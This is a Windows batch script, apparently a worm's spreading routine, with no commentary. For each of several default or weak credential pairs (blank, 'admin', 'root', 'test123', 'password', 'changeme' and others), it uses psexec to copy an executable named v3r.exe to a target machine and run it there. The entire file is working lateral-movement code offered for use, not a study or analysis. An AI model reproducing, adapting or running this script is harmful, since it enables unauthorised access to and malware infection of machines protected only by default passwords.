if "%2"=="blkad" goto blkad
if "%2"=="adad" goto adad
if "%2"=="adadmin" goto adadmin
if "%2"=="rootroot" goto rootroot
if "%2"=="adminad" goto adminad
if "%2"=="adtest" goto adtest
if "%2"=="testt" goto testt
if "%2"=="adtestt" goto adtestt
if "%2"=="adtemp" goto adtemp
if "%2"=="adtempp" goto adtempp
if "%2"=="adpass" goto adpass
if "%2"=="adpassw" goto adpassw
if "%2"=="adminch" goto adminch
:blkad
psexec \\%1 -u Administrator -p "" -d attrib.exe -r v3r.exe
psexec \\%1 -u Administrator -p "" -f -c -d v3r.exe -o
psexec \\%1 -u Administrator -p "" -d v3r.exe -o
goto end
:adad
psexec \\%1 -u Administrator -p "admin" -d attrib.exe -r v3r.exe
psexec \\%1 -u Administrator -p "admin" -f -c -d v3r.exe -o
psexec \\%1 -u Administrator -p "admin" -d v3r.exe -o
goto end
:adadmin
psexec \\%1 -u Administrator -p "administrator" -d attrib.exe -r v3r.exe
psexec \\%1 -u Administrator -p "administrator" -f -c -d v3r.exe -o
psexec \\%1 -u Administrator -p "administrator" -d v3r.exe -o
goto end
:rootroot
psexec \\%1 -u root -p "root" -d attrib.exe -r v3r.exe
psexec \\%1 -u root -p "root" -f -c -d v3r.exe -o
psexec \\%1 -u root -p "root" -d v3r.exe -o
goto end
:adminad
psexec \\%1 -u admin -p "admin" -d attrib.exe -r v3r.exe
psexec \\%1 -u admin -p "admin" -f -c -d v3r.exe -o
psexec \\%1 -u admin -p "admin" -d v3r.exe -o
goto end
:adtest
psexec \\%1 -u administrator -p "test" -d attrib.exe -r v3r.exe
psexec \\%1 -u administrator -p "test" -f -c -d v3r.exe -o
psexec \\%1 -u administrator -p "test" -d v3r.exe -o
goto end
:testt
psexec \\%1 -u test -p "test" -d attrib.exe -r v3r.exe
psexec \\%1 -u test -p "test" -f -c -d v3r.exe -o
psexec \\%1 -u test -p "test" -d v3r.exe -o
goto end
:adtestt
psexec \\%1 -u administrator -p "test123" -d attrib.exe -r v3r.exe
psexec \\%1 -u administrator -p "test123" -f -c -d v3r.exe -o
psexec \\%1 -u administrator -p "test123" -d v3r.exe -o
goto end
:adtemp
psexec \\%1 -u administrator -p "temp" -d attrib.exe -r v3r.exe
psexec \\%1 -u administrator -p "temp" -f -c -d v3r.exe -o
psexec \\%1 -u administrator -p "temp" -d v3r.exe -o
goto end
:adtempp
psexec \\%1 -u administrator -p "temp123" -d attrib.exe -r v3r.exe
psexec \\%1 -u administrator -p "temp123" -f -c -d v3r.exe -o
psexec \\%1 -u administrator -p "temp123" -d v3r.exe -o
goto end
:adpass
psexec \\%1 -u administrator -p "pass" -d attrib.exe -r v3r.exe
psexec \\%1 -u administrator -p "pass" -f -c -d v3r.exe -o
psexec \\%1 -u administrator -p "pass" -d v3r.exe -o
goto end
:adpassw
psexec \\%1 -u administrator -p "password" -d attrib.exe -r v3r.exe
psexec \\%1 -u administrator -p "password" -f -c -d v3r.exe -o
psexec \\%1 -u administrator -p "password" -d v3r.exe -o
goto end
:adminch
psexec \\%1 -u administrator -p "changeme" -d attrib.exe -r v3r.exe
psexec \\%1 -u administrator -p "changeme" -f -c -d v3r.exe -o
psexec \\%1 -u administrator -p "changeme" -d v3r.exe -o
goto end
:end
